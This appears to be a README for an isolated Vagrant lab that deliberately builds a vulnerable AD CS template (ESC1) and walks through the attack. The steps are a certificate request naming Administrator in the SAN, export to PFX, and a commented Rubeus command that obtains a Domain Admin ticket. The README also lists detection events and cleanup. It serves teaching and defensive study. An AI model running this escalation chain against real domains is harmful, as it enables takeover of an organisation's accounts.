# ADCS ESC1 Lab

> **⚠️ WARNING: FOR EDUCATIONAL/ISOLATED LAB USE ONLY**
> 
> This lab creates **intentionally vulnerable** Active Directory Certificate Services configurations to demonstrate ESC1-style certificate template abuse. Use ONLY in isolated environments with no external network access.

## Overview

This Vagrant lab provides a reproducible, idempotent environment for safely demonstrating and learning about the ESC1 vulnerability in Active Directory Certificate Services (AD CS).

**ESC1** occurs when a certificate template:
- Allows requesters to specify the subject name (including Subject Alternative Names)
- Grants enrollment rights to low-privileged users  
- Includes authentication-capable Extended Key Usage (EKU) like Client Authentication
- Requires no manager approval

This combination allows attackers to request certificates for any user (including Domain Admins) and authenticate as them.

## Lab Architecture

```
┌─────────────────────────────────────────────────┐
│  Host-Only Network: 192.168.57.0/24 (No DHCP) │
└─────────────────────────────────────────────────┘
                      │
        ┌─────────────┴───────────────┐
        │                             │
   ┌────▼─────┐                  ┌───▼──────┐
   │    DC    │                  │ CLIENT01 │
   │  Win2019 │                  │  Win 10  │
   └──────────┘                  └──────────┘
   192.168.57.10                 192.168.57.11
   
   Roles:                        Roles:
   • Domain Controller           • Domain Member
   • DNS Server                  • Test Workstation  
   • Enterprise CA               • Certificate Requester
   • ESC1User Template (vuln)
```

**Specifications:**
- **Platform:** VirtualBox
- **VMs:** 2 (DC and CLIENT01)
- **CPU per VM:** 1 core
- **RAM per VM:** 4GB
- **Network:** Static IPs, isolated host-only
- **Domain:** `adcs.local`

## Prerequisites

- **VirtualBox** 6.1+ installed
- **Vagrant** 2.2+ installed
- **Windows host** (paths assume E: drive)
- **Available RAM:** 8GB+ (4GB per VM)
- **Disk space:** ~30GB for boxes and VMs

## Quick Start

### 1. Initial Setup

```powershell
# Navigate to lab directory
cd E:\ADCS\adcs-esc1-lab

# Start both VMs (DC will provision first, then CLIENT01)
vagrant up --provider=virtualbox
```

**First boot will take 15-30 minutes** as Vagrant:
1. Downloads Windows boxes (~10GB total, one-time only)
2. Creates VMs
3. Provisions DC (installs AD DS, AD CS, creates users, configures ESC1 template)
4. Provisions CLIENT01 (joins domain, configures network)

Both VMs will reboot automatically during provisioning.

### ⚠️ IMPORTANT: Multi-Stage DC Provisioning

**DC provisioning is a multi-stage process that requires a manual reload step:**

```powershell
# Stage 1: Initial provision (installs AD DS feature, promotes to DC)
vagrant up dc

# ⏱️ WAIT: DC will reboot automatically after AD DS promotion (~2-3 minutes)
# You'll see "ADDSDeployment module not found" error - THIS IS NORMAL AND EXPECTED

# Stage 2: Complete provisioning (after reboot, installs AD CS and ESC1 template)
vagrant reload dc --provision
```

**Why this is necessary:**
- Windows requires a reboot after AD DS feature installation for the `ADDSDeployment` module to load
- The module is needed to promote the server to a Domain Controller  
- After reboot, the idempotent provisioning script continues from where it leftoff
- This is standard Windows Server domain controller deployment behavior

**What to expect:**
1. `vagrant up dc` - Installs AD DS feature, sets Administrator password, initiates DC promotion
2. **Automatic reboot** - VM reboots to load AD modules (2-3 min wait)
3. `vagrant reload dc --provision` - Completes DC promotion, installs AD CS, creates ESC1User template and users

If you see these errors during first provision, **they are EXPECTED**:
- `ADDSDeployment module not found` ✅ Normal - module loads after reboot
- `CertUtil: -setreg command FAILED` ✅ Normal - CA not installed yet  
- `Cannot find any service with service name 'CertSvc'` ✅ Normal - installs on second provision


### ⚠️ Manual Steps Required (5-10 minutes total)

Due to Windows Server automation limitations, 2 manual steps are required:

**Step 1: Install CA** (PowerShell or GUI)  
**Step 2: Create ESC1User Template** (PowerShell or GUI)

📖 **Complete Guide:** See **[PROVISIONING.md](PROVISIONING.md)** for detailed walkthrough of both methods.

Quick PowerShell commands also provided in PROVISIONING.md (fastest - 2 minutes each).

### 2. Verify Status

```powershell
# Check VM status
vagrant status

# View provisioning summary
type E:\ADCS\adcs-esc1-lab\status.txt

# Check state flags
dir E:\ADCS\adcs-esc1-lab\state\
```

### 3. Access VMs

```powershell
# SSH into DC
vagrant ssh dc

# SSH into CLIENT01
vagrant ssh client01
```

**Domain Credentials:**
- **Domain Admin:** `ADCS\Administrator` / `LabAdmin@2024!Secure`
- **Lab Users:** See [Created Users](#created-users) section below

## What Gets Configured

### Domain Controller (DC)

✅ **Active Directory Domain Services**
- Domain: `adcs.local`
- NetBIOS: `ADCS`
- Forest/Domain Functional Level: Windows Server 2016

✅ **Active Directory Certificate Services**
- Enterprise Root CA: `ADCS-CA`
- Validity: 5 years
- Auto-enrollment configured

✅ **ESC1User Certificate Template** (Intentionally Vulnerable)
- Based on: User template
- ⚠️ Allows requester to supply subject (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)
- ⚠️ Allows UPN in Subject Alternative Name
- ⚠️ EKU includes Client Authentication (enables Kerberos auth)
- ⚠️ Enrollment granted to `Domain Users` group
- ⚠️ No manager approval required

✅ **AD Users Created**

| Username      | Password                   | Full Name        |
|---------------|----------------------------|------------------|
| johndoe       | P@ssw0rd!John2024          | John Doe         |
| janesmith     | P@ssw0rd!Jane2024          | Jane Smith       |
| alicejohnson  | P@ssw0rd!2024@             | Alice Johnson    |
| bobwilliams   | P@ssw0rd!Bob2024           | Bob Williams     |
| charliebrown  | P@ssw0rd!Charlie2024       | Charlie Brown    |

✅ **Services**
- DNS Server
- WinRM (port 5985)
- Certificate Services

### Client Workstation (CLIENT01)

✅ **Network Configuration**
- Static IP: `192.168.57.11`
- DNS Server: `192.168.57.10` (DC)
- Hosts file fallback entries

✅ **Domain Membership**
- Joined to: `adcs.local`
- Computer account: `CLIENT01$`

✅ **Tools**
- `certutil.exe` (inbox)
- RSAT AD PowerShell (if available)

✅ **Services**
- WinRM (port 5985)

## ESC1 Attack Demonstration (Manual Steps)

This section walks through safely demonstrating the ESC1 vulnerability for educational purposes.

### Prerequisites

- Lab fully provisioned (both VMs running)
- Access to CLIENT01
- Low-privileged domain account (e.g., `johndoe`)

### Attack Chain

#### Step 1: Log into CLIENT01 as Low-Privileged User

```powershell
# From host, SSH into CLIENT01
vagrant ssh client01

# Or use RDP (if GUI needed)
# Username: adcs\johndoe
# Password: P@ssw0rd!John2024
```

#### Step 2: Verify ESC1User Template Availability

```powershell
# List available certificate templates
certutil -CATemplates -config "dc.adcs.local\ADCS-CA"

# You should see "ESC1User" in the list
```

#### Step 3: Create Certificate Request with Custom Subject

Create a request INF file that specifies a privileged user (e.g., Administrator) in the Subject Alternative Name.

**Create `C:\Temp\malicious.inf`:**

```ini
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN=johndoe"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10
ProviderName = "Microsoft Software Key Storage Provider"
HashAlgorithm = SHA256

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=Administrator@adcs.local&"
```

**Important:** The `2.5.29.17` OID is Subject Alternative Name. We're requesting a cert for `Administrator` while authenticated as `johndoe`.

#### Step 4: Generate and Submit Certificate Request

```powershell
# Create certificate request
certreq -new C:\Temp\malicious.inf C:\Temp\malicious.req

# Submit to CA (using ESC1User template)
certreq -submit -config "dc.adcs.local\ADCS-CA" -attrib "CertificateTemplate:ESC1User" C:\Temp\malicious.req C:\Temp\malicious.cer

# If successful, you'll receive the certificate
```

The CA should **approve and issue** the certificate because:
1. `johndoe` has enrollment rights (Domain Users group)
2. Template allows custom subject (ESC1 vuln)
3. No manager approval needed

#### Step 5: Export Certificate to PFX

```powershell
# Create directory for artifacts
New-Item -Path "E:\ADCS\adcs-esc1-lab\artifacts" -ItemType Directory -Force

# Export certificate with private key to PFX
certutil -exportPFX -p "SecurePassword123!" my <serial_number> E:\ADCS\adcs-esc1-lab\artifacts\escalated.pfx

# Find serial number with:
certutil -store my
```

#### Step 6: Verify Certificate Contents

```powershell
# Inspect the PFX file
certutil -dump E:\ADCS\adcs-esc1-lab\artifacts\escalated.pfx

# Check Subject Alternative Name
# You should see: UPN=Administrator@adcs.local
```

#### Step 7: Use Certificate for Authentication (Advanced)

**⚠️ This step is for reference only. Do NOT automate privilege escalation in the lab scripts.**

Tools like **Rubeus** (from SpecterOps) can use the PFX to request a Kerberos TGT as the targeted user:

```powershell
# Example (not included in lab):
# Rubeus.exe asktgt /user:Administrator /certificate:escalated.pfx /password:SecurePassword123! /domain:adcs.local /dc:192.168.57.10 /ptt
```

This would grant you a TGT for `Administrator`, effectively escalating privileges from `johndoe` to Domain Admin.

## Detection and Logging

### Event IDs to Monitor

Monitor these Event IDs on the **Domain Controller** in the **Security** log:

| Event ID | Description | Details |
|----------|-------------|---------|
| **4886** | Certificate Services received a certificate request | Logs the requester and template used |
| **4887** | Certificate Services approved and issued a certificate | Indicates successful certificate issuance |
| **4888** | Certificate Services denied a certificate request | Logs denials (good for baseline) |

### Query Security Events

#### PowerShell

```powershell
# On DC, check for certificate enrollment events
Get-WinEvent -LogName Security | Where-Object {$_.Id -in @(4886, 4887, 4888)} | Select-Object TimeCreated, Id, Message | Format-List

# Filter for ESC1User template specifically
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Where-Object {$_.Message -like "*ESC1User*"}
```

#### Event Viewer GUI

1. SSH into DC: `vagrant ssh dc`
2. Run: `eventvwr.msc`
3. Navigate to: Windows Logs → Security
4. Filter Current Log → Event IDs: `4886, 4887`

#### Command Line (wevtutil)

```powershell
# Query Event 4887 (certificate issued)
wevtutil qe Security "/q:*[System[(EventID=4887)]]" /f:text /c:10

# Export to file
wevtutil epl Security E:\ADCS\adcs-esc1-lab\logs\security.evtx "/q:*[System[(EventID=4886 or EventID=4887)]]"
```

### Detection Indicators

🚩 **Suspicious Patterns:**
- Certificate requests where requester ≠ subject name
- Multiple certificate requests for privileged accounts from low-privileged users
- Certificates with unusual Subject Alternative Names (UPNs)
- Rapid certificate enrollment (automated attacks)

## Cleanup and Remediation

### Remove Vulnerable Template (After Testing)

```powershell
# SSH into DC
vagrant ssh dc

# Remove template from CA
Remove-CATemplate -Name "ESC1User" -Force

# Delete template from AD (requires AD module)
Import-Module ActiveDirectory
Remove-ADObject -Identity "CN=ESC1User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=adcs,DC=local" -Confirm:$false
```

### Remove Lab Users

```powershell
# On DC
$users = @("johndoe", "janesmith", "alicejohnson", "bobwilliams", "charliebrown")
foreach ($user in $users) {
    Remove-ADUser -Identity $user -Confirm:$false
}
```

### Destroy Lab Environment

```powershell
# From host
cd E:\ADCS\adcs-esc1-lab
vagrant destroy -f

# Remove state flags (if re-creating)
Remove-Item E:\ADCS\adcs-esc1-lab\state\*.flag
```

## Iteration and Development

### Skip Provisioning on Boot

```powershell
# Start VMs without re-provisioning
vagrant up --no-provision
```

### Re-Provision Specific VM

```powershell
# Re-run DC provisioning only
vagrant provision dc

# Re-run CLIENT01 provisioning only
vagrant provision client01
```

### Manual Re-Provisioning (Individual Steps)

To re-run a specific provisioning step, delete its state flag:

```powershell
# Example: Re-create ESC1User template
Remove-Item E:\ADCS\adcs-esc1-lab\state\template_esc1_configured.flag
vagrant provision dc
```

**State flags:**
- `dc_ad_installed.flag` - AD DS installation
- `ca_installed.flag` - AD CS installation
- `template_esc1_configured.flag` - ESC1User template creation
- `users_created.flag` - AD user creation
- `winrm_configured.flag` - WinRM setup (DC)
- `client_network_configured.flag` - Client network config
- `client_domain_joined.flag` - Domain join
- `client_completed.flag` - Full client provisioning

### Snapshots (Recommended)

Take snapshots before running attack demonstrations:

```powershell
# Create snapshot
vagrant snapshot save dc dc_clean
vagrant snapshot save client01 client_clean

# Restore snapshot
vagrant snapshot restore dc dc_clean
vagrant snapshot restore client01 client_clean

# List snapshots
vagrant snapshot list
```

## Troubleshooting

### DC Provisioning Fails

**Symptom:** AD DS or AD CS installation fails

**Solution:**
1. Check logs: `E:\ADCS\adcs-esc1-lab\logs\provision_*.log`
2. Ensure sufficient RAM (4GB per VM)
3. Delete state flags and re-provision:
   ```powershell
   Remove-Item E:\ADCS\adcs-esc1-lab\state\dc_*.flag
   vagrant provision dc
   ```

### Client Cannot Join Domain

**Symptom:** Domain join fails with credential errors

**Solution:**
1. Ensure DC is fully provisioned (`vagrant status`)
2. Verify DC reachability from CLIENT01:
   ```powershell
   vagrant ssh client01
   Test-Connection -ComputerName 192.168.57.10 -Count 4
   ```
3. Check DNS resolution:
   ```powershell
   Resolve-DnsName dc.adcs.local -Server 192.168.57.10
   ```
4. Verify domain admin password matches between scripts

### ESC1User Template Not Available

**Symptom:** `certutil -CATemplates` doesn't list ESC1User

**Solution:**
1. Check if template creation succeeded:
   ```powershell
   type E:\ADCS\adcs-esc1-lab\logs\provision_*.log | Select-String "ESC1"
   ```
2. Re-create template:
   ```powershell
   Remove-Item E:\ADCS\adcs-esc1-lab\state\template_esc1_configured.flag
   vagrant provision dc
   ```

### Network Adapter Creation Requires Admin

**Symptom:** VirtualBox fails to create host-only adapter

**Solution:**
Run PowerShell or Command Prompt **as Administrator** before running `vagrant up`. VirtualBox needs elevated privileges to create network adapters.

## File Structure

```
E:\ADCS\adcs-esc1-lab\
├── Vagrantfile                 # Main Vagrant configuration
├── README.md                   # This file
├── status.txt                  # Auto-generated provisioning summary
│
├── provision\
│   ├── helpers.ps1            # Shared utility functions
│   ├── dc_provision.ps1       # DC provisioning script
│   └── client_provision.ps1   # Client provisioning script
│
├── state\                      # Idempotency marker files
│   ├── dc_ad_installed.flag
│   ├── ca_installed.flag
│   ├── template_esc1_configured.flag
│   ├── users_created.flag
│   └── ... (other state flags)
│
├── logs\                       # Provisioning logs
│   └── provision_*.log
│
└── artifacts\                  # Generated certificates (lab use only)
    └── escalated.pfx          # Example exported certificate
```

## Security Best Practices

### Lab Isolation

✅ **DO:**
- Use host-only networking (no external routing)
- Keep VMs powered off when not in use
- Use snapshots before exploitation testing
- Review logs after demonstrations

❌ **DON'T:**
- Connect lab to production networks
- Use these configurations in real environments
- Leave VMs running unattended
- Share certificates outside the lab

### Post-Lab Cleanup

After completing your learning:

1. **Destroy VMs:** `vagrant destroy -f`
2. **Delete artifacts:** `Remove-Item E:\ADCS\adcs-esc1-lab\artifacts\*`
3. **Clear logs:** `Remove-Item E:\ADCS\adcs-esc1-lab\logs\*`
4. **Remove Vagrant boxes (optional):**
   ```powershell
   vagrant box remove StefanScherer/windows_2019
   vagrant box remove StefanScherer/windows_10
   ```

## References and Further Reading

### ESC1 and AD CS Abuse

- **SpecterOps - Certified Pre-Owned:** [https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
  - Original research paper on AD CS abuse techniques
  
- **Semperis - ESC1 Attack Explained:** [https://www.semperis.com/blog/](https://www.semperis.com/blog/)
  - Detailed breakdown of ESC1 attack vectors

- **BeyondTrust - AD CS Security:** [https://www.beyondtrust.com/](https://www.beyondtrust.com/)
  - Detection patterns and Event ID monitoring

### Tools (For Advanced Testing)

- **Certify (SpecterOps):** Enumerate vulnerable certificate templates
- **Rubeus (SpecterOps):** Request Kerberos tickets using certificates
- **PSPKIAudit:** PowerShell module for AD CS auditing

**⚠️ Note:** These tools are NOT included in the lab. You must download and use them separately at your own risk.

## License

This lab is provided for **educational purposes only**. Use at your own risk. The author assumes no liability for misuse of this lab environment.

## Credits

- **Vagrant Boxes:** [StefanScherer](https://app.vagrantup.com/StefanScherer) (Windows boxes)
- **Research:** SpecterOps (Certified Pre-Owned whitepaper)
- **Lab Design:** ADCS ESC1 Lab Project

---

**Happy Learning! 🎓🔐**

Remember: Use this knowledge responsibly and only in authorized environments.
